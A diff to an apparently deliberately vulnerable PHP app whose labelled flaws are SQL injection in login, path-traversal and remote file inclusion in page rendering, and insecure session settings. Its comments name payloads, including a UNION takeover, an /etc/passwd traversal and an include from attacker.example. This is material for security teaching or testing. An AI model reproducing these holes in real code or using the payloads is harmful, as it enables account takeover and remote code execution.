@@ -8,6 +8,7 @@ declare(strict_types=1);
 // reads the session cookie, cookie_secure is off so it leaks over plain HTTP, use_strict_mode is
 // off so an attacker-supplied session ID is accepted, and there is no regeneration after login.
 ini_set('session.cookie_httponly', '0');
+ini_set('session.cookie_secure', '0');
 ini_set('session.use_strict_mode', '0');
 session_start();
 
@@ -18,13 +19,16 @@ function connect(): PDO
 
 function login(PDO $db): bool
 {
-    // VULN: PHP-05 -- the query is assembled by concatenation around request data, so the password
-    // comparison can be bypassed with a value like `' OR '1'='1` and any row can be read or written.
+    // VULN: PHP-05 -- the query is assembled by concatenation around request data, so $email can
+    // inject SQL and change which row -- and whose pass_hash -- password_verify checks below. A
+    // UNION payload supplies an attacker-known hash for a row of the attacker's choosing, turning
+    // the injection into a full account takeover without knowing any real user's password.
     $email = $_POST['email'] ?? '';
+    $password = $_POST['password'] ?? '';
     $sql = "SELECT id, role, pass_hash FROM users WHERE email = '" . $email . "'";
     $row = $db->query($sql)->fetch(PDO::FETCH_ASSOC);
 
-    if ($row === false) {
+    if ($row === false || !password_verify($password, $row['pass_hash'])) {
         return false;
     }
 
@@ -49,9 +53,9 @@ function restorePreferences(): array
 
 function renderPage(): void
 {
-    // VULN: PHP-03 -- the page name is concatenated into an include path, so `?page=../../../../etc/passwd%00`
-    // or a traversal into a config file is served, and with allow_url_include on this is direct
-    // code execution.
+    // VULN: PHP-03 -- the page name is concatenated into an include path, so `?page=../../../../etc/passwd`
+    // reads any file the process can access, and `?page=http://attacker.example/shell` under
+    // allow_url_include is direct code execution.
     $page = $_GET['page'] ?? 'home';
     include __DIR__ . '/pages/' . $page . '.php';
 }
